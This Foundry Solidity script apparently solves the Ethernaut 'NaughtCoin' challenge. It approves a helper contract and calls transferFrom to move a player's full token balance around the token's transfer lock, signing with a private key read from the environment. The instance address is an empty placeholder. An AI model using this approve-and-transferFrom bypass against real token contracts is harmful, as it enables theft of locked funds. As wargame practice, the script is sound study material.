// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/15-NaughtCoin.sol";
import "openzeppelin-contracts-06/token/ERC20/ERC20.sol";


contract Exploit is Script {
    address public NaughtCoinInstance;

    constructor(address _NaughtCoinInstance) {
        NaughtCoinInstance = _NaughtCoinInstance;
    }


    function attack() external {
        NaughtCoinInstance.call(abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            msg.sender,
            address(this),
            //uint256 balance = ERC20(address(NaughtCoinInstance)).balanceOf(msg.sender);
            1000000 * (10**18)
        ));
    }

}




contract Exp is Script {

    NaughtCoin public NaughtCoinInstance = NaughtCoin(payable(/*获取的实例地址*/));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");
    //Exploit public exploit;


    function run() external {
        vm.startBroadcast(hacker);

        uint256 playerBalance = NaughtCoinInstance.balanceOf(owner);
        console.log("Player balance before transfer:", playerBalance);

        Exploit exploit = new Exploit(address(NaughtCoinInstance));
        IERC20(NaughtCoinInstance).approve(address(exploit), 1000000 * (10**18));
        exploit.attack();

        console.log("Player balance after transfer:", NaughtCoinInstance.balanceOf(owner));
        
        vm.stopBroadcast();
    }
}